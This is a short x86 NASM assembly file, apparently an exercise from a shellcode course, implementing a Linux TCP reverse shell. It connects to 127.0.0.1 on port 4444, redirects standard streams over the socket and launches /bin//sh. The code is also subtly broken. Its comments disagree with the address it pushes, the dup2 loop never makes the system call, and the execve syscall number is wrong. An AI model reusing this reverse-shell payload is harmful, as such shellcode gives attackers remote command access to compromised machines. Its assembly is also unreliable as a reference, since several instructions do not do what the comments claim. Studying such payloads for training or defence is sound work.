;File: Tcp_Reverse_Shell.nasm
;Author: Bhanu Teja
;SLAE-1426

global _start

section .text

_start:

; zeroing all registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;
; creating a socket
;

mov al, 0x66	; socketcall syscall 102 | Hex is 0x66
mov bl, 0x1	; #define SYS_SOCKET 1

;
; create socket(AF_INET, SOCKSTREAM, IP_PROTO)
;
push ecx	; Ecx is zero pushing for value IP_PROTO value 
push ebx	; Ebx is 1 pushing for value SOCK_STREAM
push 0x2	; pushing 2 for value AF_INET
mov ecx, esp
int 0x80

;
; connecting to socket 
; connect(int sockfd, const struct sockaddr *addr((sin.family=AF_INET, sin_port=4444, sin_addr=0.0.0.0)), socklen_t addrlen);
;

mov edi, eax	; moving created socket to edi from eax
mov al, 0x66	; socketcall syscall 102
mov bl, 0x3	; #define SYS_CONNECT 3
push 0x0100007f	; pushing IP addr 127.1.1.1
push word 0x5c11; pushing port 4444
push 0x2	; push 2 for AF_INET
mov ecx, esp	; ecx points to top of stack
int 0x80	; execute

xor ecx, ecx	; zeroing ecx
loop:
	mov al, 0x3f	; dup2 syscall 63 hex is 0x3f
	mov ebx, edi	; moving socket from edi to ebx
	inc cl		; increment ecx
	cmp cl, 0x4	; compare if cl is 4 
	jne loop

;
; execute shell
;

mov al, 0xa	; EXECVE syscall 11 hex is 0xa
xor edx, edx	; zeroing edx
push edx	; null variable for envp
push 0x68732f2f	;	
push 0x6e69622f	;
mov ebx, esp	
mov ecx, edx	; move edx 0 into ecx
int 0x80

